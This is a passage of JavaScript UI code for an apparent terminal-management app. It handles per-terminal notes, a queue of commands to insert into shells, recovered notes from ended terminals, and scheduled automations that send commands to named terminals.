    .reduce((count, record) => count + record.queue.length, 0);
  const pendingCount = activeQueueCount + state.terminalArtifacts.unparentedQueue.length;
  const recoveredCount = state.terminalArtifacts.recoveredNotes.length;

  if (elements.terminalArtifactsBadge) {
    elements.terminalArtifactsBadge.hidden = pendingCount === 0;
    elements.terminalArtifactsBadge.textContent = pendingCount > 99 ? "99+" : String(pendingCount);
  }
  if (elements.terminalArtifactsToggle) {
    const label = `Terminal notes and command queue: ${pendingCount} queued, ${recoveredCount} recovered note${recoveredCount === 1 ? "" : "s"}`;
    elements.terminalArtifactsToggle.title = label;
    elements.terminalArtifactsToggle.setAttribute("aria-label", label);
  }

  for (const terminal of state.terminals.values()) {
    const record = state.terminalArtifacts.terminals[terminal.id];
    const queueCount = record?.queue.length || 0;
    const autoQueueCount = record?.queue.filter((item) => item.runWhenReady).length || 0;
    const hasNotes = Boolean(record?.notes.trim());
    const button = terminal.pane.querySelector('[data-action="artifacts"]');
    const badge = button?.querySelector(".pane-artifacts-badge");
    const dequeueButton = terminal.pane.querySelector('[data-action="dequeue"]');
    const dequeueBadge = dequeueButton?.querySelector(".pane-dequeue-badge");
    const quickQueueButton = terminal.pane.querySelector(".pane-queue-add");
    const quickQueueBadge = quickQueueButton?.querySelector(".pane-queue-add-badge");
    if (!button || !badge) continue;
    badge.hidden = queueCount === 0;
    badge.textContent = queueCount > 9 ? "9+" : String(queueCount);
    button.classList.toggle("has-artifacts", hasNotes || queueCount > 0);
    const label = `Terminal notes and command queue${queueCount ? `, ${queueCount} queued` : ""}${hasNotes ? ", notes saved" : ""}`;
    button.title = label;
    button.setAttribute("aria-label", label);
    if (dequeueButton && dequeueBadge) {
      const nextCommand = record?.queue[0]?.command || "";
      dequeueButton.hidden = queueCount === 0;
      if (queueCount > 0) refreshIcons(dequeueButton);
      dequeueBadge.textContent = queueCount > 9 ? "9+" : String(queueCount);
      const dequeueLabel = queueCount
        ? `Insert next queued command without pressing Enter (${queueCount} queued): ${nextCommand}`
        : "No commands queued";
      dequeueButton.title = queueCount
        ? `Insert next queued command without pressing Enter (Ctrl+Shift+Q)\n${nextCommand}`
        : dequeueLabel;
      dequeueButton.setAttribute("aria-label", dequeueLabel);
    }
    if (quickQueueButton && quickQueueBadge) {
      quickQueueBadge.hidden = autoQueueCount === 0;
      quickQueueBadge.textContent = autoQueueCount > 9 ? "9+" : String(autoQueueCount);
      quickQueueButton.classList.toggle("has-auto-queue", autoQueueCount > 0);
      const quickQueueLabel = autoQueueCount
        ? `Queue a command; ${autoQueueCount} waiting to run automatically`
        : "Queue a command for when this terminal is ready";
      quickQueueButton.title = quickQueueLabel;
      quickQueueButton.setAttribute("aria-label", quickQueueLabel);
    }
  }
}

function refreshTerminalArtifactTargets(preferredId) {
  const target = elements.terminalArtifactsTarget;
  if (!target) return;
  const terminals = liveArtifactTerminals();
  const preferred = preferredId || target.value || state.activeId;
  target.textContent = "";

  for (const terminal of terminals) {
    const option = document.createElement("option");
    option.value = terminal.id;
    option.textContent = `${terminal.titleInput.value || "Terminal"} \u00b7 ${terminal.pid ? `PID ${terminal.pid}` : "starting"}`;
    target.append(option);
  }

  const unparented = document.createElement("option");
  unparented.value = UNPARENTED_QUEUE_VALUE;
  const count = state.terminalArtifacts.unparentedQueue.length;
  unparented.textContent = `Unparented queue${count ? ` (${count})` : ""}`;
  target.append(unparented);

  target.value = [...target.options].some((option) => option.value === preferred)
    ? preferred
    : terminals[0]?.id || UNPARENTED_QUEUE_VALUE;
}

function refreshUnparentedQueueTargets(preferredId) {
  const select = elements.unparentedQueueTarget;
  if (!select) return;
  const terminals = liveArtifactTerminals();
  const preferred = preferredId || select.value || state.activeId;
  select.textContent = "";

  if (terminals.length === 0) {
    const option = document.createElement("option");
    option.value = "";
    option.textContent = "No live terminals";
    select.append(option);
    select.disabled = true;
    return;
  }

  select.disabled = false;
  for (const terminal of terminals) {
    const option = document.createElement("option");
    option.value = terminal.id;
    option.textContent = `${terminal.titleInput.value || "Terminal"} \u00b7 ${terminal.pid ? `PID ${terminal.pid}` : "starting"}`;
    select.append(option);
  }
  select.value = terminals.some((terminal) => terminal.id === preferred) ? preferred : terminals[0].id;
}

function artifactTimeLabel(value) {
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return "";
  return date.toLocaleString(undefined, {
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "numeric",
    minute: "2-digit"
  });
}

function renderCommandQueue(items, source) {
  elements.commandQueueList.textContent = "";
  elements.commandQueueEmpty.hidden = items.length > 0;

  for (const item of items) {
    const card = document.createElement("article");
    card.className = `command-queue-item${source === "unparented" ? " is-unparented" : ""}${item.runWhenReady ? " is-auto" : ""}`;

    const send = document.createElement("button");
    send.type = "button";
    send.className = "command-queue-send";
    send.dataset.queueSend = item.id;
    send.title = item.runWhenReady
      ? "Insert now without pressing Enter"
      : "Insert into terminal without pressing Enter";

    const command = document.createElement("span");
    command.className = "command-queue-command";
    command.textContent = item.command;
    const meta = document.createElement("span");
    meta.className = "command-queue-meta";
    const sourcePid = source === "unparented" && item.pid ? `From PID ${item.pid} \u00b7 ` : "";
    meta.textContent = `${sourcePid}${artifactTimeLabel(item.createdAt)} \u00b7 ${item.runWhenReady ? "Runs automatically when ready" : "Insert without Enter"}`;
    send.append(command, meta);

    const remove = document.createElement("button");
    remove.type = "button";
    remove.className = "command-queue-delete";
    remove.dataset.queueDelete = item.id;
    remove.title = "Remove queued command";
    remove.setAttribute("aria-label", "Remove queued command");
    const icon = document.createElement("i");
    icon.dataset.lucide = "x";
    remove.append(icon);

    card.append(send, remove);
    elements.commandQueueList.append(card);
  }
}

function renderRecoveredNotes() {
  const entries = state.terminalArtifacts.recoveredNotes;
  elements.recoveredNotesList.textContent = "";
  elements.recoveredNotesEmpty.hidden = entries.length > 0;

  for (const entry of entries) {
    const card = document.createElement("article");
    card.className = "recovered-note";
    card.dataset.recoveredId = entry.id;

    const head = document.createElement("div");
    head.className = "recovered-note-head";
    const identity = document.createElement("div");
    const title = document.createElement("strong");
    title.textContent = entry.title || "Terminal";
    const meta = document.createElement("span");
    meta.textContent = [
      entry.pid ? `PID ${entry.pid}` : null,
      artifactTimeLabel(entry.recoveredAt),
      entry.reason
    ].filter(Boolean).join(" \u00b7 ");
    identity.append(title, meta);

    const remove = document.createElement("button");
    remove.type = "button";
    remove.className = "recovered-note-delete";
    remove.dataset.recoveredDelete = entry.id;
    remove.title = "Delete recovered note";
    remove.setAttribute("aria-label", `Delete recovered note for ${entry.title || "terminal"}`);
    const icon = document.createElement("i");
    icon.dataset.lucide = "trash-2";
    remove.append(icon);
    head.append(identity, remove);

    const notes = document.createElement("textarea");
    notes.className = "recovered-note-input";
    notes.dataset.recoveredNotes = entry.id;
    notes.rows = 4;
    notes.value = entry.notes;
    notes.setAttribute("aria-label", `Recovered notes for ${entry.title || "terminal"}`);

    card.append(head, notes);
    elements.recoveredNotesList.append(card);
  }
}

function renderTerminalArtifacts() {
  if (!elements.terminalArtifactsOverlay) return;
  const selected = elements.terminalArtifactsTarget.value;
  const terminal = selected === UNPARENTED_QUEUE_VALUE ? null : state.terminals.get(selected);
  const liveTerminal = artifactTerminalIsAvailable(terminal) ? terminal : null;
  const isUnparented = !liveTerminal;
  let queue;

  elements.terminalNotesSection.hidden = isUnparented;
  elements.unparentedTargetRow.hidden = !isUnparented;
  elements.terminalNotesSaved.textContent = "";

  if (liveTerminal) {
    const record = ensureTerminalArtifact(liveTerminal);
    elements.terminalNotesInput.value = record.notes;
    elements.terminalNotesIdentity.textContent = `${liveTerminal.titleInput.value || "Terminal"} \u00b7 ${liveTerminal.pid ? `PID ${liveTerminal.pid}` : "process starting"}`;
    elements.terminalArtifactsSubtitle.textContent = "Notes and queued commands stay with this terminal process.";
    elements.commandQueueHint.textContent = "Click a queued command to insert it into this terminal without pressing Enter.";
    elements.commandQueueInput.placeholder = "Stage a command or prompt for this terminal\u2026";
    queue = record.queue;
  } else {
    elements.terminalArtifactsSubtitle.textContent = "Commands from ended terminals stay usable in the unparented queue.";
    elements.commandQueueHint.textContent = "Choose a live target, then click a command to insert it without pressing Enter.";
    elements.commandQueueInput.placeholder = "Stage an unparented command or prompt\u2026";
    refreshUnparentedQueueTargets();
    queue = state.terminalArtifacts.unparentedQueue;
  }

  renderCommandQueue(queue, isUnparented ? "unparented" : "terminal");
  renderRecoveredNotes();
  updateTerminalArtifactIndicators();
  refreshIcons();
}

function addCommandQueueItem() {
  const raw = elements.commandQueueInput.value;
  const command = safeTerminalCommand(raw);
  if (!command) {
    toast(
      sanitizeTerminalCommand(raw)
        ? `Commands are limited to ${MAX_TERMINAL_COMMAND_LENGTH} characters.`
        : "Enter a command or prompt to queue.",
      "info",
      1800
    );
    elements.commandQueueInput.focus();
    return;
  }

  const item = { id: createId(), command, createdAt: new Date().toISOString() };
  const selected = elements.terminalArtifactsTarget.value;
  const terminal = state.terminals.get(selected);
  if (selected === UNPARENTED_QUEUE_VALUE || !artifactTerminalIsAvailable(terminal)) {
    state.terminalArtifacts.unparentedQueue.push(item);
  } else {
    ensureTerminalArtifact(terminal).queue.push(item);
  }

  elements.commandQueueInput.value = "";
  saveTerminalArtifacts();
  refreshTerminalArtifactTargets(selected);
  renderTerminalArtifacts();
  elements.commandQueueInput.focus();
}

function selectedArtifactQueue() {
  const selected = elements.terminalArtifactsTarget.value;
  if (selected === UNPARENTED_QUEUE_VALUE) {
    return { items: state.terminalArtifacts.unparentedQueue, terminal: null, source: "unparented" };
  }
  const terminal = state.terminals.get(selected);
  const record = terminal ? state.terminalArtifacts.terminals[selected] : null;
  return { items: record?.queue || [], terminal, source: "terminal" };
}

function removeCommandQueueItem(id) {
  const selected = selectedArtifactQueue();
  const index = selected.items.findIndex((item) => item.id === id);
  if (index < 0) {
    toast("That queued command is no longer available.", "info", 1800);
    return;
  }
  selected.items.splice(index, 1);
  saveTerminalArtifacts();
  refreshTerminalArtifactTargets(elements.terminalArtifactsTarget.value);
  renderTerminalArtifacts();
}

function focusTerminalAfterQueueInsert(terminal, { closeArtifacts = true } = {}) {
  if (terminal.pageId !== state.activePageId) setActivePage(terminal.pageId, { focus: false });
  if (terminal.minimized) restoreTerminal(terminal.id);
  setActiveTerminal(terminal.id);
  revealTerminal(terminal);
  if (closeArtifacts) closeTerminalArtifacts({ restoreFocus: false });
  window.requestAnimationFrame(() => terminal.term.focus());
}

function dequeueQueueItem({
  items,
  terminal,
  id,
  source = "terminal",
  sourceTerminal = terminal,
  closeArtifacts = true
}) {
  const index = items.findIndex((item) => item.id === id);
  if (index < 0) {
    toast("That queued command is no longer available.", "info", 1800);
    return false;
  }

  if (!artifactTerminalIsAvailable(terminal)) {
    if (source === "terminal" && sourceTerminal) {
      orphanTerminalArtifacts(sourceTerminal, "terminal ended before queued command was inserted");
    }
    toast("Choose a live terminal before inserting this command.", "error", 2400);
    if (closeArtifacts) renderTerminalArtifacts();
    return false;
  }
  if (terminal.status !== "live") {
    toast("That terminal is not ready yet; the command remains queued.", "info", 2200);
    return false;
  }

  // Last line of defense before the PTY. The stored command was already filtered
  // on the way in, so a mismatch here means the persisted copy was altered behind
  // the app's back; drop the entry rather than typing an unreviewed payload into
  // a live shell.
  const command = safeTerminalCommand(items[index].command);
  if (!command) {
    items.splice(index, 1);
    saveTerminalArtifacts();
    if (closeArtifacts) renderTerminalArtifacts();
    toast("That queued command was malformed and has been discarded.", "error", 2600);
    return false;
  }
  if (!sendBridge({ type: "input", id: terminal.id, data: command })) {
    toast("Bridge unavailable; the command remains queued.", "error", 2400);
    return false;
  }

  items.splice(index, 1);
  saveTerminalArtifacts();
  focusTerminalAfterQueueInsert(terminal, { closeArtifacts });
  return true;
}

function dequeueCommand(id) {
  const selected = selectedArtifactQueue();
  const terminal = selected.source === "unparented"
    ? state.terminals.get(elements.unparentedQueueTarget.value)
    : selected.terminal;
  return dequeueQueueItem({
    items: selected.items,
    terminal,
    id,
    source: selected.source,
    sourceTerminal: selected.terminal,
    closeArtifacts: true
  });
}

function dequeueNextTerminalCommand(terminal) {
  if (!terminal) {
    toast("Select a terminal before dequeuing a command.", "info", 1800);
    return false;
  }
  const queue = state.terminalArtifacts.terminals[terminal.id]?.queue || [];
  const next = queue[0];
  if (!next) {
    toast("This terminal has no queued commands.", "info", 1800);
    return false;
  }
  return dequeueQueueItem({
    items: queue,
    terminal,
    id: next.id,
    closeArtifacts: false
  });
}

// Dequeues one specific command (by id) for a terminal — used by the context
// menu's "Command queue" submenu. Like the FIFO path it inserts the command
// without pressing Enter and removes it from the queue.
function dequeueTerminalCommand(terminal, id) {
  if (!terminal) {
    toast("Select a terminal before dequeuing a command.", "info", 1800);
    return false;
  }
  const queue = state.terminalArtifacts.terminals[terminal.id]?.queue || [];
  return dequeueQueueItem({
    items: queue,
    terminal,
    id,
    closeArtifacts: false
  });
}

function openTerminalArtifacts(terminalId = null) {
  if (!elements.terminalArtifactsOverlay) return;
  closePalette();
  hideContextMenu();
  state.terminalArtifactsHub.returnFocus = document.activeElement instanceof HTMLElement
    ? document.activeElement
    : null;
  const preferred = artifactTerminalIsAvailable(state.terminals.get(terminalId))
    ? terminalId
    : artifactTerminalIsAvailable(state.terminals.get(state.activeId))
      ? state.activeId
      : UNPARENTED_QUEUE_VALUE;
  refreshTerminalArtifactTargets(preferred);
  renderTerminalArtifacts();
  elements.terminalArtifactsOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.terminalArtifactsOverlay.classList.add("is-open"));
  elements.terminalArtifactsTarget.focus();
}

function closeTerminalArtifacts({ restoreFocus = true } = {}) {
  if (!elements.terminalArtifactsOverlay) return;
  const returnFocus = state.terminalArtifactsHub.returnFocus;
  state.terminalArtifactsHub.returnFocus = null;
  window.clearTimeout(state.terminalArtifactsHub.savedTimer);
  state.terminalArtifactsHub.savedTimer = 0;
  elements.terminalArtifactsOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.terminalArtifactsOverlay.hidden = true;
    if (restoreFocus && returnFocus?.isConnected) returnFocus.focus({ preventScroll: true });
  }, 150);
}

function bindTerminalArtifactsHub() {
  if (!elements.terminalArtifactsOverlay) return;
  updateTerminalArtifactIndicators();
  elements.terminalArtifactsClose.addEventListener("click", () => closeTerminalArtifacts());
  elements.terminalArtifactsOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.terminalArtifactsOverlay) closeTerminalArtifacts();
  });
  elements.terminalArtifactsTarget.addEventListener("change", renderTerminalArtifacts);
  elements.terminalNotesInput.addEventListener("input", () => {
    const terminal = state.terminals.get(elements.terminalArtifactsTarget.value);
    if (!artifactTerminalIsAvailable(terminal)) {
      toast("This terminal is no longer available; its notes were recovered.", "info", 2200);
      renderTerminalArtifacts();
      return;
    }
    const record = ensureTerminalArtifact(terminal);
    record.notes = elements.terminalNotesInput.value;
    record.notesUpdatedAt = new Date().toISOString();
    elements.terminalNotesSaved.textContent = "Saved";
    window.clearTimeout(state.terminalArtifactsHub.savedTimer);
    state.terminalArtifactsHub.savedTimer = window.setTimeout(() => {
      elements.terminalNotesSaved.textContent = "";
      state.terminalArtifactsHub.savedTimer = 0;
    }, 1400);
    saveTerminalArtifacts();
  });
  elements.commandQueueAdd.addEventListener("click", addCommandQueueItem);
  elements.commandQueueInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter" && event.ctrlKey && !event.isComposing) {
      event.preventDefault();
      addCommandQueueItem();
    }
  });
  elements.commandQueueList.addEventListener("click", (event) => {
    const remove = event.target.closest("[data-queue-delete]");
    if (remove) {
      removeCommandQueueItem(remove.dataset.queueDelete);
      return;
    }
    const send = event.target.closest("[data-queue-send]");
    if (send) dequeueCommand(send.dataset.queueSend);
  });
  elements.recoveredNotesList.addEventListener("input", (event) => {
    const input = event.target.closest("[data-recovered-notes]");
    if (!input) return;
    const entry = state.terminalArtifacts.recoveredNotes.find((item) => item.id === input.dataset.recoveredNotes);
    if (!entry) {
      toast("That recovered note is no longer available.", "info", 1800);
      return;
    }
    entry.notes = input.value;
    entry.notesUpdatedAt = new Date().toISOString();
    saveTerminalArtifacts();
  });
  elements.recoveredNotesList.addEventListener("click", (event) => {
    const button = event.target.closest("[data-recovered-delete]");
    if (!button) return;
    const index = state.terminalArtifacts.recoveredNotes.findIndex((item) => item.id === button.dataset.recoveredDelete);
    if (index < 0) {
      toast("That recovered note is no longer available.", "info", 1800);
      return;
    }
    state.terminalArtifacts.recoveredNotes.splice(index, 1);
    saveTerminalArtifacts();
    renderRecoveredNotes();
    refreshIcons();
  });
}

/* ---------------- Automations --------------- */

function automationHistoryLimit() {
  const value = Number(state?.settings?.automationHistoryLimit ?? defaultSettings.automationHistoryLimit);
  return Number.isFinite(value) && value >= 0 ? Math.round(value) : defaultSettings.automationHistoryLimit;
}

function loadAutomationStore(historyLimit = defaultSettings.automationHistoryLimit) {
  try {
    const raw = JSON.parse(localStorage.getItem(AUTOMATIONS_STORAGE_KEY) || "null");
    return automationApi.normalizeStore(raw, historyLimit);
  } catch {
    return automationApi.normalizeStore(null, historyLimit);
  }
}

function saveAutomationStore() {
  state.automations = automationApi.normalizeStore(state.automations, automationHistoryLimit());
  localStorage.setItem(AUTOMATIONS_STORAGE_KEY, JSON.stringify(state.automations));
  updateAutomationBadge();
}

function addAutomationHistory(status, title, detail = "", automationId = null) {
  state.automations.history.push({
    automationId,
    detail,
    id: createId(),
    occurredAt: new Date().toISOString(),
    status,
    title
  });
  saveAutomationStore();
  renderAutomationActivity();
  renderAutomationRuleList();
}

function automationScheduleSummary(rule) {
  const trigger = rule?.trigger || {};
  if (trigger.mode === "daily") return `Daily at ${trigger.time}`;
  if (trigger.mode === "weekly") {
    const labels = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
    return `${trigger.days.map((day) => labels[day]).join(", ")} at ${trigger.time}`;
  }
  const minutes = Number(trigger.intervalMinutes) || 60;
  if (minutes % 60 === 0) {
    const hours = minutes / 60;
    return `Every ${hours} hour${hours === 1 ? "" : "s"}`;
  }
  return `Every ${minutes} minute${minutes === 1 ? "" : "s"}`;
}

function automationNextRunLabel(rule) {
  if (!rule.enabled) return "Disabled";
  const next = automationApi.nextScheduledAt(rule, new Date());
  if (!next) return "Schedule unavailable";
  return `Next ${next.toLocaleString([], { weekday: "short", hour: "numeric", minute: "2-digit" })}`;
}

function automationLastOutcome(rule) {
  const entry = [...state.automations.history].reverse().find((item) => item.automationId === rule.id);
  if (!entry) return { label: "No activity yet", status: "none" };
  const occurredAt = new Date(entry.occurredAt);
  const when = Number.isFinite(occurredAt.getTime())
    ? occurredAt.toLocaleString([], { month: "short", day: "numeric", hour: "numeric", minute: "2-digit" })
    : "Unknown time";
  return { label: `Last ${entry.status} · ${when}`, status: entry.status };
}

function updateAutomationBadge() {
  if (!elements.automationBadge || !elements.automationToggle) return;
  const pending = state.automations.pendingStages.length;
  const enabled = state.automations.rules.filter((rule) => rule.enabled).length;
  elements.automationBadge.hidden = pending === 0;
  elements.automationBadge.textContent = pending > 99 ? "99+" : String(pending);
  const status = state.automations.paused ? "paused" : `${enabled} enabled`;
  elements.automationToggle.title = `Automations: ${status}`;
  elements.automationToggle.setAttribute("aria-label", `Automations: ${status}`);
}

function automationTerminalOptions(selectedName = "") {
  const names = [...state.terminals.values()]
    .filter((terminal) => terminal.status === "live")
    .map((terminal) => terminal.titleInput.value || "Terminal");
  if (selectedName && !names.some((name) => automationApi.terminalName(name) === automationApi.terminalName(selectedName))) {
    names.unshift(selectedName);
  }
  return [...new Set(names)];
}

function createAutomationActionRow(action = {}) {
  const row = document.createElement("div");
  row.className = "automation-action-row";
  row.dataset.actionId = action.id || createId();

  const targetLabel = document.createElement("label");
  const targetCaption = document.createElement("span");
  targetCaption.textContent = "Terminal";
  const target = document.createElement("select");
  target.className = "automation-action-target";
  target.required = true;
  for (const name of automationTerminalOptions(action.targetName || "")) {
    const option = document.createElement("option");
    option.value = name;
    option.textContent = name;
    target.append(option);
  }
  if (!target.options.length) {
    const option = document.createElement("option");
    option.value = "";
    option.textContent = "No live terminals";
    target.append(option);
  }
  target.value = action.targetName || target.options[0].value;
  targetLabel.append(targetCaption, target);

  const commandLabel = document.createElement("label");
  const commandCaption = document.createElement("span");
  commandCaption.textContent = "Command or prompt";
  const command = document.createElement("input");
  command.className = "automation-action-command";
  command.type = "text";
  command.maxLength = MAX_TERMINAL_COMMAND_LENGTH;
  command.required = true;
  command.autocomplete = "off";
  command.spellcheck = false;
  command.value = action.command || "";
  commandLabel.append(commandCaption, command);

  const deliveryLabel = document.createElement("label");
  const deliveryCaption = document.createElement("span");
  deliveryCaption.textContent = "Delivery";
  const delivery = document.createElement("select");
  delivery.className = "automation-action-delivery";
  delivery.innerHTML = '<option value="run">Run when ready</option><option value="stage">Stage when ready</option>';
  delivery.value = action.submit === false ? "stage" : "run";
  deliveryLabel.append(deliveryCaption, delivery);

  const remove = document.createElement("button");
  remove.type = "button";
  remove.className = "icon-button automation-action-remove";
  remove.title = "Remove action";
  remove.setAttribute("aria-label", "Remove action");
  remove.innerHTML = '<i data-lucide="x"></i>';
  remove.addEventListener("click", () => {
    row.remove();
    if (!elements.automationActionList.children.length) createAutomationActionRow();
    updateAutomationPreview();
  });
  row.addEventListener("input", updateAutomationPreview);
  row.append(targetLabel, commandLabel, deliveryLabel, remove);
  elements.automationActionList.append(row);
  refreshIcons(row);
  return row;
}

function selectedAutomationScheduleMode() {
  return elements.automationEditor.querySelector("[data-schedule-mode][aria-pressed='true']")?.dataset.scheduleMode || "interval";
}

function setAutomationScheduleMode(mode) {
  const normalized = ["daily", "weekly"].includes(mode) ? mode : "interval";
  for (const button of elements.automationEditor.querySelectorAll("[data-schedule-mode]")) {
    button.setAttribute("aria-pressed", String(button.dataset.scheduleMode === normalized));
  }
  elements.automationIntervalFields.hidden = normalized !== "interval";
  elements.automationClockFields.hidden = normalized === "interval";
  elements.automationDays.hidden = normalized !== "weekly";
  updateAutomationPreview();
}

function readAutomationEditorRule(existing = null) {
  const mode = selectedAutomationScheduleMode();
  const value = Math.max(1, Math.round(Number(elements.automationInterval.value) || 1));
  const intervalMinutes = value * (elements.automationIntervalUnit.value === "hours" ? 60 : 1);
  const days = [...elements.automationDays.querySelectorAll("[data-day][aria-pressed='true']")]
    .map((button) => Number(button.dataset.day));
  const actions = [...elements.automationActionList.querySelectorAll(".automation-action-row")].map((row) => ({
    command: row.querySelector(".automation-action-command").value,
    id: row.dataset.actionId,
    submit: row.querySelector(".automation-action-delivery").value === "run",
    targetName: row.querySelector(".automation-action-target").value
  }));
  return automationApi.normalizeRule({
    actions,
    createdAt: existing?.createdAt || new Date().toISOString(),
    enabled: existing?.enabled === true,
    id: existing?.id || createId(),
    lastRunAt: existing?.lastRunAt || null,
    name: elements.automationName.value,
    trigger: {
      catchUp: elements.automationCatchUp.checked ? "once" : "skip",
      days,
      intervalMinutes,
      mode,
      time: elements.automationTime.value,
      type: "schedule"
    },
    updatedAt: new Date().toISOString()
  });
}

function updateAutomationPreview() {
  if (!elements.automationPreview) return;
  const rule = readAutomationEditorRule(state.automations.rules.find((item) => item.id === state.automationStudio.editingId));
  const actionCount = elements.automationActionList.children.length;
  elements.automationPreview.textContent = rule
    ? `${automationScheduleSummary(rule)} · ${actionCount} action${actionCount === 1 ? "" : "s"}`
    : "Add at least one destination and command";
}

function openAutomationEditor(id = null) {
  const rule = id ? state.automations.rules.find((item) => item.id === id) : null;
  state.automationStudio.editingId = rule?.id || null;
  elements.automationEditor.hidden = false;
  elements.automationWelcome.hidden = true;
  elements.automationEditorTitle.textContent = rule ? rule.name : "New automation";
  elements.automationDelete.hidden = !rule;
  elements.automationName.value = rule?.name || "";
  elements.automationCatchUp.checked = rule?.trigger.catchUp === "once";
  elements.automationTime.value = rule?.trigger.time || "09:00";
  const intervalMinutes = rule?.trigger.intervalMinutes || 60;
  const usesHours = intervalMinutes >= 60 && intervalMinutes % 60 === 0;
  elements.automationInterval.value = String(usesHours ? intervalMinutes / 60 : intervalMinutes);
  elements.automationIntervalUnit.value = usesHours ? "hours" : "minutes";
  const selectedDays = new Set(rule?.trigger.days || [1, 2, 3, 4, 5]);
  for (const button of elements.automationDays.querySelectorAll("[data-day]")) {
    button.setAttribute("aria-pressed", String(selectedDays.has(Number(button.dataset.day))));
  }
  elements.automationActionList.textContent = "";
  for (const action of rule?.actions || [{}]) createAutomationActionRow(action);
  setAutomationScheduleMode(rule?.trigger.mode || "interval");
  renderAutomationRuleList();
  elements.automationName.focus();
}

function closeAutomationEditor() {
  state.automationStudio.editingId = null;
  elements.automationEditor.hidden = true;
  elements.automationWelcome.hidden = false;
  renderAutomationRuleList();
}

function saveAutomationEditor(event) {
  event?.preventDefault();
  const currentIndex = state.automations.rules.findIndex((item) => item.id === state.automationStudio.editingId);
  const current = currentIndex >= 0 ? state.automations.rules[currentIndex] : null;
  const rule = readAutomationEditorRule(current);
  if (!rule) {
    toast("Add a name, destination, and command", "info", 2200);
    return false;
  }
  rule.enabled = true;
  if (currentIndex >= 0) state.automations.rules.splice(currentIndex, 1, rule);
  else state.automations.rules.push(rule);
  state.automationStudio.editingId = rule.id;
  saveAutomationStore();
  renderAutomationStudio();
  toast("Automation saved and enabled", "success", 1800);
  return true;
}

function deleteAutomationEditor() {
  const id = state.automationStudio.editingId;
  const index = state.automations.rules.findIndex((item) => item.id === id);
  if (index < 0) return;
  const [removed] = state.automations.rules.splice(index, 1);
  saveAutomationStore();
  closeAutomationEditor();
  toast(`Deleted ${removed.name}`, "info", 1600);
}

function toggleAutomationRule(id) {
  const rule = state.automations.rules.find((item) => item.id === id);
  if (!rule) return;
  rule.enabled = !rule.enabled;
  rule.updatedAt = new Date().toISOString();
  saveAutomationStore();
  renderAutomationRuleList();
}

function renderAutomationRuleList() {
  if (!elements.automationRuleList) return;
  const query = elements.automationSearch.value.trim().toLocaleLowerCase();
  const rules = state.automations.rules.filter((rule) => !query || `${rule.name} ${automationScheduleSummary(rule)}`.toLocaleLowerCase().includes(query));
  elements.automationRuleList.textContent = "";
  elements.automationRuleEmpty.hidden = rules.length > 0;
  for (const rule of rules) {
    const row = document.createElement("div");
    row.className = `automation-rule-row${rule.id === state.automationStudio.editingId ? " is-selected" : ""}`;
    const open = document.createElement("button");
    open.type = "button";
    open.className = "automation-rule-open";
    open.dataset.automationEdit = rule.id;
    const copy = document.createElement("span");
    copy.className = "automation-rule-copy";
    const name = document.createElement("strong");
    name.textContent = rule.name;
    const summary = document.createElement("span");
    summary.textContent = `${automationScheduleSummary(rule)} · ${automationNextRunLabel(rule)}`;
    const lastOutcome = automationLastOutcome(rule);
    const outcome = document.createElement("span");
    outcome.className = "automation-rule-outcome";
    outcome.dataset.status = lastOutcome.status;
    outcome.textContent = lastOutcome.label;
    copy.append(name, summary, outcome);
    open.append(copy);
    const toggle = document.createElement("button");
    toggle.type = "button";
    toggle.className = `automation-rule-state${rule.enabled ? " is-enabled" : ""}`;
    toggle.dataset.automationToggle = rule.id;
    toggle.setAttribute("aria-pressed", String(rule.enabled));
    toggle.setAttribute("aria-label", `${rule.enabled ? "Disable" : "Enable"} ${rule.name}`);
    toggle.textContent = rule.enabled ? "On" : "Off";
    row.append(open, toggle);
    elements.automationRuleList.append(row);
  }
}

function renderAutomationRoutes() {
  if (!elements.automationRouteList) return;
  const links = [...state.terminalLinks.entries()];
  elements.automationRouteList.textContent = "";
  elements.automationRouteEmpty.hidden = links.length > 0;
  for (const [key, link] of links) {
    const source = state.terminals.get(link.sourceId);
    const target = state.terminals.get(link.targetId);
    const row = document.createElement("div");
    row.className = "automation-route-row";
    row.innerHTML = '<i class="automation-route-direction" data-lucide="arrow-right"></i>';
    const copy = document.createElement("div");
    copy.className = "automation-route-copy";
    const title = document.createElement("strong");
    title.textContent = `${source?.titleInput.value || link.sourceTitle || "Producer"} → ${target?.titleInput.value || link.targetTitle || "Consumer"}`;
    const meta = document.createElement("span");
    meta.textContent = link.handoffEnabled ? "Handoffs enabled" : "Handoffs disabled";
    copy.append(title, meta);
    const toggle = document.createElement("label");
    toggle.className = "automation-route-toggle";
    const checkbox = document.createElement("input");
    checkbox.type = "checkbox";
    checkbox.checked = link.handoffEnabled;
    checkbox.dataset.automationRouteToggle = key;
    checkbox.setAttribute("aria-label", `${link.handoffEnabled ? "Disable" : "Enable"} handoffs for ${title.textContent}`);
    const toggleLabel = document.createElement("span");
    toggleLabel.textContent = "Handoffs";
    toggle.append(checkbox, toggleLabel);
    const remove = document.createElement("button");
    remove.type = "button";
    remove.className = "icon-button";
    remove.dataset.automationUnlink = key;
    remove.title = "Remove route";
    remove.setAttribute("aria-label", `Remove route ${title.textContent}`);
    remove.innerHTML = '<i data-lucide="unlink-2"></i>';
    row.append(copy, toggle, remove);
    elements.automationRouteList.append(row);
  }
  refreshIcons(elements.automationRouteList);
}

function renderAutomationActivity() {
  if (!elements.automationActivityList) return;
  const filter = elements.automationActivityFilter.value;
  const entries = [...state.automations.history].reverse().filter((entry) => {
    if (filter === "schedules") return Boolean(entry.automationId);
    if (filter === "handoffs") return !entry.automationId;
    if (filter === "attention") return ["blocked", "failed", "skipped"].includes(entry.status);
    return true;
  });
  elements.automationActivityList.textContent = "";
  elements.automationActivityEmpty.hidden = entries.length > 0;
  elements.automationActivityEmpty.textContent = state.automations.history.length
    ? "No activity matches this filter."
    : "No automation activity yet.";
  for (const entry of entries) {
    const row = document.createElement("div");
    row.className = "automation-activity-row";
    row.dataset.status = entry.status;
    const tone = document.createElement("i");
    tone.className = "automation-activity-tone";
    const copy = document.createElement("div");
    copy.className = "automation-activity-copy";
    const title = document.createElement("strong");
    title.textContent = entry.title;
    const detail = document.createElement("span");
    detail.textContent = entry.detail || entry.status;
    copy.append(title, detail);
